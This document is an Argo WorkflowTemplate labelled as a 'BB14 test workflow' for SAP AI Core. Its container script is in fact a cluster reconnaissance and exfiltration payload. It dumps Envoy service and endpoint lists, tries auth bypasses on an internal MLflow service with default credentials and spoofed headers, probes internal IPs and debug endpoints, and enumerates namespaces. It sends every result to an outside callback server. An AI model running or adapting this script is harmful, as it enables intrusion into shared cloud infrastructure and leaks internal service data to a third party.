apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "5.0.1"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 5 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }

        get "recon5-start-$(hostname)"

        # 1. Full unique cluster service names
        curl -k -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9][-a-z0-9]*\.[a-z0-9][-a-z0-9]*\.svc\.cluster\.local' | sort -u > /tmp/svcs.txt
        wc -l /tmp/svcs.txt | post "recon5-svc-count"
        head -c 700 /tmp/svcs.txt | post "recon5-svcs-1"
        tail -c +701 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-2"
        tail -c +1401 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-3"
        tail -c +2101 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-4"

        # 2. Extract unique namespaces
        cat /tmp/svcs.txt | awk -F. '{print $2}' | sort -u | post "recon5-namespaces"

        # 3. Cluster endpoints via JSON format
        curl -k -s "http://127.0.0.1:15000/clusters?format=json" > /tmp/clust.json
        wc -c /tmp/clust.json | post "recon5-clust-size"
        # Extract just name->ip:port pairs using grep/sed
        grep -oE '"name":"[^"]+"|"address":"[^"]+"|"port_value":[0-9]+' /tmp/clust.json | head -c 2000 | post "recon5-endpoints-1"
        grep -oE '"name":"[^"]+"|"address":"[^"]+"|"port_value":[0-9]+' /tmp/clust.json | tail -c +2001 | head -c 2000 | post "recon5-endpoints-2"

        # 4. MLflow tracking - auth bypass attempts
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Authorization: Basic YWRtaW46YWRtaW4=" | head -c 700 | post "recon5-track-basic64"
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "X-Internal: true" | head -c 700 | post "recon5-track-xinternal"
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Cookie: session=admin" | head -c 700 | post "recon5-track-cookie"

        # 5. SAP Connectivity Service exploration
        CONN="http://100.104.7.43:20003"
        curl -k -s --connect-timeout 3 "${CONN}/" -H "SAP-CP-Connectivity-Service-Token: test" | head -c 700 | post "recon5-conn-tok"
        curl -k -s --connect-timeout 3 "${CONN}/healthz" | head -c 700 | post "recon5-conn-hz"
        curl -k -s --connect-timeout 3 "${CONN}/" -v 2>&1 | head -c 700 | post "recon5-conn-verbose"

        # 6. Probe ALL services found in Envoy mesh
        for svc in $(cat /tmp/svcs.txt | head -30); do
          result=$(curl -k -s --connect-timeout 2 "http://${svc}/" 2>&1 | head -c 200)
          if [ -n "$result" ]; then
            echo "${svc}: ${result}" | post "recon5-probe-$(echo $svc | cut -d. -f1)"
          fi
        done

        # 7. Services on port 8888 with more paths
        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
          for path in /healthz /metrics /debug/pprof /api/v1/status /ready; do
            r=$(curl -k -s --connect-timeout 2 "http://${ip}:8888${path}" 2>&1)
            if [ -n "$r" ] && ! echo "$r" | grep -q "404 page not found"; then
              echo "${ip}:8888${path}: ${r}" | head -c 400 | post "recon5-p8888"
            fi
          done
        done

        # 8. OTel collector deeper
        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/tracez" | head -c 700 | post "recon5-otel-traces"
        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/rpcz" | head -c 700 | post "recon5-otel-rpc"

        # 9. Try directly accessing other rg namespaces via DNS
        for ns in ml-tracking ml-serving ai-core istio-system kube-system dynatrace opentelemetry; do
          nslookup "${ns}.svc.cluster.local" 2>&1 | head -c 200 | post "recon5-dns-${ns}"
        done

        get "recon5-done-$(hostname)"
      resources:
        limits:
          cpu: "1"
          memory: "1Gi"
        requests:
          cpu: "100m"
          memory: "256Mi"
